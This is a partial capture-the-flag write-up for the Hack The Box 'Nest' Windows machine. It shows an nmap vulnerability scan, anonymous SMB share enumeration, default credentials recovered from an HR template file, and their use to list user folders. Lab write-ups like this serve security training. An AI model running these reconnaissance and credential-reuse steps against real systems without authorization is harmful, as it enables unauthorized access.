# Nest

> OS: Windows Difficulty: Easy Points: 20 Release: 25 Jan 2020 IP: 10.10.10.178

## Port Scanning

```
root @ darlene : ~
➤ nmap -A -Pn -p- --script=vuln 10.10.10.178
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-27 21:55 CET
Nmap scan report for 10.10.10.178
Host is up (0.054s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
```

## SMB Enumeration

```
root @ darlene : ~
➤ smbclient -L 10.10.10.178 -U ""
Unable to initialize messaging context
Enter WORKGROUP\'s password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	Secure$         Disk      
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.178 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
root @ darlene : ~
➤ smbclient //10.10.10.178/Data
Unable to initialize messaging context
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Aug  8 00:53:46 2019
  ..                                  D        0  Thu Aug  8 00:53:46 2019
  IT                                  D        0  Thu Aug  8 00:58:07 2019
  Production                          D        0  Mon Aug  5 23:53:38 2019
  Reports                             D        0  Mon Aug  5 23:53:44 2019
  Shared                              D        0  Wed Aug  7 21:07:51 2019

		10485247 blocks of size 4096. 6449565 blocks available
smb: \> 
```

```
smb: \Shared\Templates\HR\> get "Welcome Email.txt"
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (2.1 KiloBytes/sec) (average 2.1 KiloBytes/sec)
```

```
root @ darlene : ~
➤ cat Welcome\ Email.txt 
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR⏎
```

```
root @ darlene : ~
➤ smbclient //10.10.10.178\\Users -U "TempUser"
Unable to initialize messaging context
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jan 26 00:04:21 2020
  ..                                  D        0  Sun Jan 26 00:04:21 2020
  Administrator                       D        0  Fri Aug  9 17:08:23 2019
  C.Smith                             D        0  Sun Jan 26 08:21:44 2020
  L.Frost                             D        0  Thu Aug  8 19:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 19:02:50 2019
  TempUser                            D        0  Thu Aug  8 00:55:56 2019

		10485247 blocks of size 4096. 6449700 blocks available
smb: \>
```






